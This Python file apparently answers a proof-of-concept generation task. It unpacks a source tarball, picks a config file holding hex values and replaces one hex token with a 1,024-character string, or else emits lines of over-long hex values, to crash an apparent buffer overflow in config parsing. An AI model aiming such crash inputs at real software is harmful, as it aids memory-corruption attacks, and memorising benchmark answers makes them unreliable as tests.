import os
import tarfile
import tempfile
import re


class Solution:
    def solve(self, src_path: str) -> bytes:
        root_dir = self._prepare_root(src_path)
        known_conf_names = self._collect_conf_names(root_dir)
        poc = self._generate_from_sample_config(root_dir, known_conf_names)
        if poc is not None:
            return poc
        return self._fallback_poc()

    def _prepare_root(self, src_path: str) -> str:
        if os.path.isdir(src_path):
            return src_path

        root_dir = src_path
        if not tarfile.is_tarfile(src_path):
            return src_path

        tmpdir = tempfile.mkdtemp(prefix="pocgen_")
        try:
            with tarfile.open(src_path, "r:*") as tf:
                tf.extractall(tmpdir)
        except Exception:
            return src_path

        entries = [os.path.join(tmpdir, e) for e in os.listdir(tmpdir)]
        dirs = [p for p in entries if os.path.isdir(p)]
        if len(dirs) == 1:
            return dirs[0]
        return tmpdir

    def _collect_conf_names(self, root_dir: str) -> set:
        exts_c = {".c", ".h", ".cc", ".cpp", ".cxx"}
        patt = re.compile(r'"([^"]+\.(?:conf|cfg|ini|config|cnf))"')
        names = set()
        for dirpath, _, filenames in os.walk(root_dir):
            for fname in filenames:
                ext = os.path.splitext(fname)[1].lower()
                if ext not in exts_c:
                    continue
                path = os.path.join(dirpath, fname)
                try:
                    if os.path.getsize(path) > 512 * 1024:
                        continue
                except OSError:
                    continue
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        text = f.read()
                except Exception:
                    continue
                for m in patt.finditer(text):
                    names.add(os.path.basename(m.group(1)))
        return names

    def _generate_from_sample_config(self, root_dir: str, known_conf_names: set) -> bytes | None:
        text_exts = {
            ".conf",
            ".cfg",
            ".cfg.in",
            ".ini",
            ".txt",
            ".config",
            ".cnf",
            ".sample",
            ".yaml",
            ".yml",
            ".toml",
            ".json",
        }
        hex0x_re = re.compile(r'0[xX][0-9a-fA-F]{2,}')
        hexplain_re = re.compile(r'\b[0-9a-fA-F]{4,}\b')

        best_info = None
        best_score = 0.0

        for dirpath, _, filenames in os.walk(root_dir):
            for fname in filenames:
                lower = fname.lower()
                ext = os.path.splitext(lower)[1]
                is_text = ext in text_exts or "conf" in lower or "config" in lower
                if not is_text:
                    continue
                path = os.path.join(dirpath, fname)
                try:
                    size = os.path.getsize(path)
                    if size > 256 * 1024:
                        continue
                except OSError:
                    continue
                try:
                    with open(path, "r", encoding="utf-8", errors="ignore") as f:
                        content = f.read()
                except Exception:
                    continue

                m1 = list(hex0x_re.finditer(content))
                m2 = list(hexplain_re.finditer(content))
                if not m1 and not m2:
                    continue

                score = len(m1) * 3 + len(m2)
                base = os.path.basename(path)
                if base in known_conf_names:
                    score *= 5
                elif "conf" in lower or "config" in lower:
                    score *= 2
                if any(x in lower for x in ("example", "sample", "test")):
                    score *= 1.5

                if score > best_score:
                    best_score = score
                    best_info = (path, content, m1, m2)

        if not best_info:
            return None

        _, content, m1, m2 = best_info
        m = m1[0] if m1 else m2[0]
        token = m.group(0)

        long_len = 1024
        if token.lower().startswith("0x"):
            prefix = token[:2]
            new_token = prefix + "A" * long_len
        else:
            new_token = "A" * long_len

        poc_str = content[:m.start()] + new_token + content[m.end():]
        return poc_str.encode("utf-8", errors="ignore")

    def _fallback_poc(self) -> bytes:
        long_hex = "A" * 1024
        keys = ["hex", "id", "key", "value", "color", "hash", "data", "code"]
        lines = []

        for key in keys:
            lines.append(f"{key} = 0x{long_hex}")
            lines.append(f"{key}=0x{long_hex}")
            lines.append(f"{key} 0x{long_hex}")
            lines.append(f"{key}:0x{long_hex}")
            lines.append(f"{key}: 0x{long_hex}")

        lines.append("0x" + long_hex)
        lines.append(long_hex)
        content = "\n".join(lines) + "\n"
        return content.encode("ascii", errors="ignore")